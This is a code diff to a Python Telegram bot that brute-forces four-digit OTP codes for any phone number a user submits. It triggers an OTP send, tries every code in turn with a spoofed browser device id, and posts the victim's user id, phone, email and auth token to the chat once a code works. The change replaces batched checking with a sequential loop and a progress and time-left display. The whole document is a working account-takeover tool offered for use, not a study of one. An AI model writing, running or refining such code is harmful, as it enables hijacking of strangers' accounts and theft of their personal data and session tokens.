@@ -40,7 +40,7 @@ def verify_otp(number, otp, device_id):
         print(f"Error verifying OTP {otp}: {e}")
         return None
 
-# Optimized function to check OTPs in batches
+# Function to check OTPs with progress bar
 async def check_otps_sequentially(number, device_id, update: Update, context: CallbackContext):
     try:
         message = await update.message.reply_text("Checking number...")
@@ -57,33 +57,37 @@ async def check_otps_sequentially(number, device_id, update: Update, context: Ca
                 progress_message = await update.message.reply_text("OTP sent successfully. Checking OTPs...\nProgress:")
 
                 total_otps = 9000
-                batch_size = 500  # Number of OTPs checked in one batch
                 start_time = time.time()
+                total_otps_checked = 0
+                last_otp_checked = 0
 
-                for start_otp in range(1000, total_otps, batch_size):
-                    end_otp = min(start_otp + batch_size, total_otps)
-                    for otp in range(start_otp, end_otp):
-                        result = verify_otp(number, otp, device_id)
+                # Sequentially check OTPs from 1000 to 9999
+                for otp in range(1000, total_otps):
+                    result = verify_otp(number, otp, device_id)
+                    total_otps_checked += 1
+                    last_otp_checked = otp
 
-                        if result:
-                            await update.message.reply_text(
-                                f"**Valid OTP Found!**\n\n"
-                                f"**User Details:**\n"
-                                f"Userid: {result['userid']}\n"
-                                f"Phone: {result['phone']}\n"
-                                f"Email: {result['email']}\n"
-                                f"Token: {result['token']}\n"
-                                f"Valid OTP: {result['otp']}",
-                                parse_mode="Markdown"
-                            )
-                            return
-
-                    # Update progress after every batch
+                    # Update progress message
                     elapsed_time = time.time() - start_time
+                    time_left = int((elapsed_time / total_otps_checked) * (total_otps - total_otps_checked)) if total_otps_checked > 0 else 0
                     progress_text = (f"**Progress Bar**\n"
-                                     f"Checked OTPs: {start_otp} - {end_otp - 1}\n"
-                                     f"Elapsed Time: {int(elapsed_time)}s")
+                                     f"Total OTPs Checked: {total_otps_checked}\n"
+                                     f"Last OTP Checked: {last_otp_checked}\n"
+                                     f"Estimated Time Left: {time_left}s")
                     await progress_message.edit_text(progress_text, parse_mode="Markdown")
+
+                    if result:
+                        await update.message.reply_text(
+                            f"**Valid OTP Found!**\n\n"
+                            f"**User Details:**\n"
+                            f"Userid: {result['userid']}\n"
+                            f"Phone: {result['phone']}\n"
+                            f"Email: {result['email']}\n"
+                            f"Token: {result['token']}\n"
+                            f"Valid OTP: {result['otp']}",
+                            parse_mode="Markdown"
+                        )
+                        return
 
                 await update.message.reply_text("OTP not found in the range 1000-9999.")
             else:
@@ -102,7 +106,7 @@ async def handle_message(update: Update, context: CallbackContext):
     number = update.message.text
     if number.isdigit() and len(number) in [10, 12]:
         await update.message.reply_text(f"Checking OTP for phone number: {number}")
-        device_id = "WebBrowser1734342653442cl8ld29gv5a"
+        device_id = "WebBrowser1734342653442cl8ld29gv5c"
         await check_otps_sequentially(number, device_id, update, context)
     else:
         await update.message.reply_text("Invalid phone number. Please enter a valid 10 or 12-digit phone number.")
